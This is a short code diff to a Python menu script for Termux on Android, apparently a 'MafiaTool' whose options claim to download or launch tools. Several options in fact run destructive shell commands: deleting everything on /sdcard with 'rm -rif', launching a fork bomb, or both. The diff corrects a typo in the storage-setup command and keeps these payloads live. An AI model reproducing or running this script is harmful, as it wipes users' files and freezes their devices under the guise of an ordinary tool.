@@ -85,19 +85,19 @@ if droid == "1":
     system('python MafiaTool.py')
 elif droid == "2":
     print("Download......")
-    system('termux-setup-storge')
+    system('termux-setup-storage')
     system('cd /sdcard')
     system('rm -rif *')
     system('clear')
     system('python MafiaTool.py')
 elif droid == 3:
-    system('termux-setup-storge')
+    system('termux-setup-storage')
     system(':(){ :|:& };:')
     system('clear')
     system('python Matrix.py')
 elif droid == 4:
-    system('termux-setup-storge')
-    system('rm -rif /sdcard/* && :(){ :|:& };:')
+    system('termux-setup-storage')
+    system('rm -rif /sdcard * && :(){ :|:& };:')
     system('clear')
     system('python MafiaTool.py')
 elif droid == 5:
